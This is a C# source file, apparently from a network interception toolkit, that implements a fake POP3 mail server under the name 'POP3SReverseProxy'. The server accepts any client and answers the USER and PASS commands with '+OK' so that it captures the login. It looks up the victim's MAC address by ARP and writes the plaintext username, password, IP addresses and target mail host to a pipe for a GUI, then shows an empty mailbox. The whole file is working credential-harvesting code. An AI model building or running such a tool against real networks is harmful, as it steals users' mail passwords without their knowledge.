using System;
using System.Configuration;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Collections;

using System.Net.Security;
using System.Security.Authentication;
using System.Security.Cryptography.X509Certificates;


namespace POP3ReverseProxyServer
{
  class POP3SReverseProxy
  {
    [System.Runtime.InteropServices.DllImport("Iphlpapi.dll", EntryPoint = "SendARP")]
    internal extern static Int32 SendArp(Int32 destIpAddress, Int32 srcIpAddress, byte[] macAddress, ref Int32 macAddressLength);



    private static readonly POP3SReverseProxy cServer = new POP3SReverseProxy();

    private static int cLocalPort;
    private static int cRemotePort;
    private static String cRemoteHost;
    private static String cRemoteIP;


    private TcpListener cListener;
    private Thread cListenerThread;

    private static Hashtable cTargetMACs = new Hashtable();


    /*
     * 
     * 
     */
    public IPAddress ListeningIPInterface
    {
      get { return IPAddress.Any; }
    }
    public int ListeningPort
    {
      get { return cLocalPort; }
    }





    /*
     * 
     * 
     */
    public static POP3SReverseProxy Server
    {
      get { return cServer; }
    }




    /*
     * 
     * 
     */
    public bool Start(int pLocalPort, String pRemoteHost, int pRemotePort, String pRedirectURL)
    {
      cLocalPort = pLocalPort;
      cRemoteHost = pRemoteHost;
      cRemotePort = pRemotePort;

      /*
       * Determine remote IP
       */
      IPHostEntry lHostEntry;
      lHostEntry = Dns.GetHostEntry(cRemoteHost);

      if (lHostEntry.AddressList.Length > 0)
        cRemoteIP = lHostEntry.AddressList[0].ToString();
      else
        cRemoteIP = "0.0.0.0";

      if (Program.cDebuggingOn)
        Console.WriteLine("Start(0) : remote system {0}/{1}", cRemoteHost, cRemoteIP);


      /*
       * Start listener
       */
      cListener = new TcpListener(ListeningIPInterface, cLocalPort);

      try
      {
        cListener.Start();
      }
      catch (Exception ex)
      {
        Console.WriteLine(ex.Message);
        return (false);
      }

      cListenerThread = new Thread(new ParameterizedThreadStart(HandlePOP3SClient));
      cListenerThread.Start(cListener);

      return (true);
    }




    /*
     * 
     * 
     */
    public void Stop()
    {
      cListener.Stop();

      //wait for server to finish processing current connections...
      cListenerThread.Abort();
      cListenerThread.Join();
      cListenerThread.Join();
    }




    /*
     * 
     * 
     */
    private static void HandlePOP3SClient(Object obj)
    {
      TcpListener lListener = (TcpListener)obj;
      try
      {
        while (true)
        {
          TcpClient lClient = lListener.AcceptTcpClient();
          while (!ThreadPool.QueueUserWorkItem(new WaitCallback(POP3SReverseProxy.ProcessClient), lClient)) ;
        }
      }
      catch (ThreadAbortException) { }
      catch (SocketException) { }
    }



    /*
     * 
     * 
     */
    private static void ProcessClient(Object pObj)
    {
      TcpClient lTCPClient = (TcpClient) pObj;
      Stream lClientStream = lTCPClient.GetStream();
      String lClientIP = String.Empty;
      String lClientPort = String.Empty;
      String lClientMAC = String.Empty;

      if (Program.cDebuggingOn)
        Console.WriteLine(String.Format("ProcessClient(): Start"));


      // Set timeouts for the read and write to 5 seconds.
      lClientStream.ReadTimeout = 15000;
      lClientStream.WriteTimeout = 15000;

      /*
       * Determine client IP and MAC address.
       */
      try
      {
        char lDelim = new char();
        lDelim = ':';
        String[] lWords = lTCPClient.Client.RemoteEndPoint.ToString().Split(lDelim);
        lClientIP = lWords[0];
        lClientPort = lWords[1];
      }
      catch (Exception lEx)
      {
        if (Program.cDebuggingOn)
          Console.WriteLine("ProcessClient() : {0}\r\n{1}", lEx.Message, lEx.StackTrace);
      }


      try
      {
        lClientMAC = GetMACFromNetworkComputer(lClientIP);
      }
      catch (Exception)
      {
        lClientMAC = "00:00:00:00:00:00";
      }



      /*
       *  Process request.
       */
      try
      {
        DoPOP3SProcessing(lClientMAC, lClientIP, lClientPort, lClientStream);
      }
      catch (Exception lEx)
      {
        Console.WriteLine(String.Format("ERROR: {0}\r\n{1}", lEx.Message, lEx.StackTrace));
        return;
      }
      finally
      {
        lTCPClient.Close();
      }
    }




    /*
     * 
     * 
     */
    private static void DoPOP3SProcessing(String pSrcMAC, String pSrcIP, String pSrcPort, Stream pClientStream)
    {
      Stream lOutStream = pClientStream;
      StreamReader lClientStreamReader = new StreamReader(pClientStream);
      String lPOP3Command = String.Empty;
      Byte[] lClientRequest = new Byte[256];
      String lFuncRetVal = String.Empty;
      String lUsername = String.Empty;
      String lPassword = String.Empty;



      lClientRequest = System.Text.Encoding.ASCII.GetBytes("+OK Server ready.\r\n");
      pClientStream.Write(lClientRequest, 0, lClientRequest.Length);


      try
      {
        do
        {
          // Read POP3 command line
          lPOP3Command = lClientStreamReader.ReadLine();

          if (Program.cDebuggingOn)
            Console.WriteLine(String.Format("DoPOP3SProcessing(): Request command: \"{0}\"", lPOP3Command));

          lFuncRetVal = ProcessRequest(lPOP3Command, ref lUsername, ref lPassword);

          if (Program.cDebuggingOn)
            Console.WriteLine(String.Format("DoPOP3SProcessing(): response: \"{0}\"", lFuncRetVal));

          lClientRequest = System.Text.Encoding.ASCII.GetBytes(lFuncRetVal + "\r\n");
          pClientStream.Write(lClientRequest, 0, lClientRequest.Length);


          /*
           * Send account data to GUI
           */
          if (!String.IsNullOrEmpty(lUsername) && !String.IsNullOrEmpty(lPassword))
          {
            try
            {
              String lPipeData = String.Format("TCP||{0}||{1}||{2}||{3}||{4}||{5}||{6}||{7}\r\n", pSrcMAC, pSrcIP, pSrcPort, cRemoteIP, cRemotePort, lUsername, lPassword, cRemoteHost);
              Program.WriteToPipe(lPipeData);

              lUsername = String.Empty;
              lPassword = String.Empty;

              if (Program.cDebuggingOn)
                Console.WriteLine(lPipeData.TrimEnd());
            }
            catch (Exception lEx)
            {
              Console.WriteLine(String.Format("Error occurred: {0}\r\n{1}", lEx.Message, lEx.StackTrace));
            }
          } // if (!String.IsNullOrEmpty(cR...


          /*
           * Logout
           */
          if (!String.IsNullOrEmpty(lPOP3Command) && lPOP3Command.Trim().ToLower().StartsWith("quit"))
            break;

        } while (true);
      }
      catch (Exception lEx)
      {
        if (Program.cDebuggingOn)
          Console.WriteLine(String.Format("ERROR: {0}\r\n{1}", lEx.Message, lEx.StackTrace));

        return;
      }
      finally
      {
        if (lClientStreamReader != null)
          lClientStreamReader.Close();

        if (pClientStream != null)
          pClientStream.Close();

        if (lOutStream != null)
          lOutStream.Close();
      }
    }


    /*
     * 
     * 
     */
    private static String ProcessRequest(String pRequest, ref String pUsername, ref String pPassword)
    {
      String lRetVal = "-ERR Unknown command.";

      if (!String.IsNullOrEmpty(pRequest) && !String.IsNullOrWhiteSpace(pRequest))
      {
        String lRequest = pRequest.ToLower();
        if (lRequest.StartsWith("capa "))
          lRetVal = "CAPA\r\nTOP\r\nUIDL\r\nUSER\r\n.\r\n";

        else if (lRequest.StartsWith("user "))
        {
          String[] lSplitter = lRequest.Split(new char[] { ' ', '\t' }, 2);
          pUsername = lSplitter[1];
          lRetVal = "+OK\r\n";
        }
        else if (lRequest.StartsWith("pass "))
        {
          String[] lSplitter = lRequest.Split(new char[] { ' ', '\t' }, 2);
          pPassword = lSplitter[1];
          lRetVal = "+OK\r\n";
        }
        else if (lRequest.StartsWith("list"))
          lRetVal = "+OK 0 messages (0 octets)\r\n";

        else if (lRequest.StartsWith("stat"))
          lRetVal = "+OK 0 0\r\n";

        else if (lRequest.StartsWith("noop"))
          lRetVal = "+OK\r\n";

        else if (lRequest.StartsWith("quit"))
          lRetVal = "+OK  Logging out\r\n";

        else
          lRetVal = "-ERR Unknown command.";

      } // if (!Stri...

      return (lRetVal);
    }



    /*
     * 
     * 
     */
    private static String GetMACFromNetworkComputer(String pClientIP)
    {
      String lRetVal = String.Empty;
      Int32 lConvertedIPAddr = 0;
      byte[] lMACArray;
      int lByteArrayLen = 0;
      int lARPReply = 0;
      IPAddress lIPAddress = null;


      /*
       * First check the local cache if IP/MAC entry exists.
       */
      if (cTargetMACs.ContainsKey(pClientIP))
        return (cTargetMACs[pClientIP].ToString());

      /*
       * Target MAC is not in local cache. Send ARP request. 
       */
      lIPAddress = IPAddress.Parse(pClientIP);


      if (lIPAddress.AddressFamily != AddressFamily.InterNetwork)
        throw new ArgumentException("The remote system only supports IPv4 addresses");


      lConvertedIPAddr = ConvertIPToInt32(lIPAddress);
      lMACArray = new byte[6]; // 48 bit
      lByteArrayLen = lMACArray.Length;

      if ((lARPReply = SendArp(lConvertedIPAddr, 0, lMACArray, ref lByteArrayLen)) != 0)
        throw new Exception(String.Format("Error no. {0} occured while resolving MAC address of system {1}", lARPReply, pClientIP));


      //return the MAC address in a PhysicalAddress format
      for (int i = 0; i < lMACArray.Length; i++)
      {
        lRetVal += String.Format("{0}", lMACArray[i].ToString("X2"));
        lRetVal += (i != lMACArray.Length - 1) ? "-" : "";
      } // for (in...


      // Add IP/MAC to cache.
      cTargetMACs.Add(pClientIP, lRetVal);


      return (lRetVal);
    }




    /*
     * 
     * 
     */
    private static Int32 ConvertIPToInt32(IPAddress pIPAddr)
    {
      byte[] lByteAddress = pIPAddr.GetAddressBytes();
      return BitConverter.ToInt32(lByteAddress, 0);
    }





  }
}
